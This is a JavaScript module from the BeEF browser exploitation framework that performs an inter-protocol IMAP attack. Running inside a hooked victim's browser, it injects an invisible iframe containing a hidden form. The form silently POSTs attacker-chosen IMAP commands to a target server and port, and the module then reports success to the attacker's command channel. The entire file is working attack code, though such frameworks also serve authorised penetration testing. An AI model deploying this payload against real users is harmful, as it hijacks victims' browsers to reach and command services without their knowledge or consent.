//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
/**
 * Inter protocol IMAP module
 * Ported from BeEF-0.4.0.0 by jgaliana (Original author: Wade)
 *
 */
beef.execute(function() {

	var server = '<%= @server %>';
	var port = '<%= @port %>';
	var commands = '<%= @commands %>';

	var target = "http://" + server + ":" + port + "/abc.html";
	var iframe = beef.dom.createInvisibleIframe();

	var form = document.createElement('form');
	form.setAttribute('name', 'data');
	form.setAttribute('action', target);
	form.setAttribute('method', 'post');
	form.setAttribute('enctype', 'multipart/form-data');

	var input = document.createElement('input');
	input.setAttribute('id', 'data1')
	input.setAttribute('name', 'data1')
	input.setAttribute('type', 'hidden');
	input.setAttribute('value', commands);
	form.appendChild(input);

	iframe.contentWindow.document.body.appendChild(form);
	form.submit();

	beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=IMAP4 commands sent");

});
